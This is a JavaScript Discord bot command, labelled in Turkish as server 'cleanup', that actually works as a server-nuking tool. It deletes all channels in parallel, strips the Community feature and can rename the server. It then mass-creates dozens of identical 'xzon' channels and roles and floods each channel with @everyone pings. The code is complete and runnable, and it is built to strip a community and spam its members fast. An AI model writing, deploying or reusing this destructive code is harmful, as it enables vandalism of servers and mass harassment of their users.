import { ChannelType, PermissionFlagsBits, SlashCommandBuilder } from "discord.js";
import { errorEmbed, successEmbed } from "../../utils/embeds.js";
import { hasAdminPerms } from "../../utils/permissions.js";
import { sendLog } from "../../systems/logger.js";

const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

/** Fire many promises in parallel chunks for speed */
async function mapPool(items, concurrency, worker) {
  const results = new Array(items.length);
  let idx = 0;
  async function run() {
    while (idx < items.length) {
      const i = idx;
      idx += 1;
      results[i] = await worker(items[i], i);
    }
  }
  const runners = Array.from({ length: Math.min(concurrency, items.length || 1) }, () => run());
  await Promise.all(runners);
  return results;
}

async function deleteChannel(ch, me) {
  try {
    if (ch.permissionOverwrites?.edit && me) {
      await ch.permissionOverwrites
        .edit(me.id, { ViewChannel: true, ManageChannels: true, Connect: true })
        .catch(() => null);
    }
    await ch.delete("sunucu-temizle");
    return true;
  } catch {
    return false;
  }
}

export default {
  data: new SlashCommandBuilder()
    .setName("sunucu-temizle")
    .setDescription("Hızlı temizle: kanallar, roller, isim, mesaj (Yönetici)")
    .setDefaultMemberPermissions(PermissionFlagsBits.Administrator)
    .setDMPermission(false)
    .addStringOption((opt) =>
      opt.setName("isim").setDescription("Kanal adı (varsayılan: xzon)").setMaxLength(32),
    )
    .addIntegerOption((opt) =>
      opt
        .setName("adet")
        .setDescription("Kaç kanal (varsayılan: 50)")
        .setMinValue(1)
        .setMaxValue(100),
    )
    .addStringOption((opt) =>
      opt
        .setName("mesaj")
        .setDescription("Mesaj metni (varsayılan: Sunucu temizlendi)")
        .setMaxLength(1800),
    )
    .addIntegerOption((opt) =>
      opt
        .setName("mesaj-adet")
        .setDescription("Kanal başına mesaj (varsayılan: 1)")
        .setMinValue(0)
        .setMaxValue(20),
    )
    .addBooleanOption((opt) =>
      opt.setName("everyone").setDescription("@everyone eklensin mi? (varsayılan: evet)"),
    )
    .addStringOption((opt) =>
      opt.setName("sunucu-adi").setDescription("Yeni sunucu adı").setMaxLength(100),
    )
    .addStringOption((opt) =>
      opt.setName("rol").setDescription("Oluşturulacak rol adı (varsayılan: xzon)").setMaxLength(100),
    )
    .addIntegerOption((opt) =>
      opt
        .setName("rol-adet")
        .setDescription("Kaç rol (varsayılan: 50)")
        .setMinValue(0)
        .setMaxValue(100),
    ),

  async execute(interaction) {
    if (!interaction.guild) {
      return interaction.reply({
        embeds: [errorEmbed("Bu komut sadece sunucuda kullanılır.")],
        ephemeral: true,
      });
    }

    if (!hasAdminPerms(interaction.member)) {
      return interaction.reply({
        embeds: [errorEmbed("Bu komut sadece yöneticiler içindir.")],
        ephemeral: true,
      });
    }

    const me = interaction.guild.members.me || (await interaction.guild.members.fetchMe());
    if (
      !me.permissions.has(PermissionFlagsBits.Administrator) &&
      !me.permissions.has(PermissionFlagsBits.ManageChannels)
    ) {
      return interaction.reply({
        embeds: [errorEmbed("Botun Kanalları Yönet / Administrator yetkisi yok.")],
        ephemeral: true,
      });
    }

    const baseName =
      String(interaction.options.getString("isim") || "xzon")
        .trim()
        .toLowerCase()
        .replace(/\s+/g, "-")
        .replace(/[^a-z0-9ğüşıöç\-]/gi, "")
        .slice(0, 32) || "xzon";
    const count = interaction.options.getInteger("adet") || 50;
    const msgBody = String(interaction.options.getString("mesaj") || "Sunucu temizlendi")
      .trim()
      .slice(0, 1800);
    const msgCountOpt = interaction.options.getInteger("mesaj-adet");
    const perChannel = msgCountOpt === null ? 1 : msgCountOpt;
    const withEveryone = interaction.options.getBoolean("everyone");
    const pingEveryone = withEveryone === null ? true : withEveryone;
    const payload = pingEveryone ? `@everyone ${msgBody}` : msgBody;
    const newGuildName = interaction.options.getString("sunucu-adi");
    const roleName = String(interaction.options.getString("rol") || "xzon").trim().slice(0, 100) || "xzon";
    const roleCountOpt = interaction.options.getInteger("rol-adet");
    const roleCount = roleCountOpt === null ? 50 : roleCountOpt;

    await interaction.deferReply({ ephemeral: true });
    const started = Date.now();
    const guild = interaction.guild;

    // 1) Rename guild ASAP (parallel with rest)
    const renamePromise = newGuildName
      ? guild.setName(newGuildName.slice(0, 100), "sunucu-temizle").catch(() => null)
      : Promise.resolve(null);

    await guild.channels.fetch();

    if (guild.features.includes("COMMUNITY")) {
      await guild
        .edit({
          features: guild.features.filter((f) => f !== "COMMUNITY"),
          rulesChannel: null,
          publicUpdatesChannel: null,
          reason: "sunucu-temizle",
        })
        .catch(() => null);
      await guild.channels.fetch().catch(() => null);
    }

    // 2) Wipe channels — high concurrency
    const toDelete = [...guild.channels.cache.values()].sort((a, b) => {
      if (a.type === ChannelType.GuildCategory && b.type !== ChannelType.GuildCategory) return 1;
      if (b.type === ChannelType.GuildCategory && a.type !== ChannelType.GuildCategory) return -1;
      return 0;
    });

    const delResults = await mapPool(toDelete, 15, (ch) => deleteChannel(ch, me));
    const deleted = delResults.filter(Boolean).length;
    const failed = delResults.length - deleted;

    // 3) Create channels in parallel batches
    const channelSlots = Array.from({ length: count }, (_, i) => i);
    const createdChannels = [];
    let createFail = 0;

    await mapPool(channelSlots, 12, async () => {
      try {
        const ch = await guild.channels.create({
          name: baseName,
          type: ChannelType.GuildText,
          reason: "sunucu-temizle",
        });
        createdChannels.push(ch);
      } catch {
        createFail += 1;
      }
    });

    // 4) Create roles in parallel
    let rolesCreated = 0;
    let roleFail = 0;
    if (roleCount > 0) {
      const roleSlots = Array.from({ length: roleCount }, (_, i) => i);
      await mapPool(roleSlots, 10, async () => {
        try {
          await guild.roles.create({
            name: roleName,
            reason: "sunucu-temizle",
            mentionable: false,
            hoist: false,
          });
          rolesCreated += 1;
        } catch {
          roleFail += 1;
        }
      });
    }

    // 5) Blast messages — all channels × count, high concurrency
    let sent = 0;
    let sendFail = 0;
    if (perChannel > 0 && createdChannels.length) {
      const jobs = [];
      for (const ch of createdChannels) {
        for (let m = 0; m < perChannel; m += 1) jobs.push(ch);
      }
      await mapPool(jobs, 20, async (ch) => {
        try {
          await ch.send({
            content: payload,
            allowedMentions: { parse: pingEveryone ? ["everyone"] : [] },
          });
          sent += 1;
        } catch {
          sendFail += 1;
        }
      });
    }

    await renamePromise;
    const ms = Date.now() - started;
    const samples = createdChannels.slice(0, 3).map((c) => `${c}`).join(" ");

    await sendLog(guild, {
      title: "🧨 Sunucu Temizleme (hızlı)",
      description: [
        `${interaction.user} · ${ms}ms`,
        `Silinen: **${deleted}** · Kanal: **${createdChannels.length}× #${baseName}**`,
        `Rol: **${rolesCreated}× ${roleName}** · Mesaj: **${sent}**`,
        newGuildName ? `Sunucu adı: **${newGuildName}**` : "",
      ]
        .filter(Boolean)
        .join("\n"),
      color: 0xed4245,
    }).catch(() => null);

    return interaction.editReply({
      embeds: [
        successEmbed(
          [
            `⚡ **${ms}ms**`,
            `Silinen: **${deleted}**${failed ? ` · ${failed} atlandı` : ""}`,
            `Kanal: **${createdChannels.length}× #${baseName}**${createFail ? ` · ${createFail} hata` : ""}`,
            `Rol: **${rolesCreated}× ${roleName}**${roleFail ? ` · ${roleFail} hata` : ""}`,
            `Mesaj: **${sent}** (${perChannel}/kanal)${sendFail ? ` · ${sendFail} hata` : ""}`,
            newGuildName ? `Sunucu adı: **${newGuildName}**` : "",
            samples ? `Örnek: ${samples}` : "",
          ]
            .filter(Boolean)
            .join("\n"),
        ),
      ],
    });
  },
};
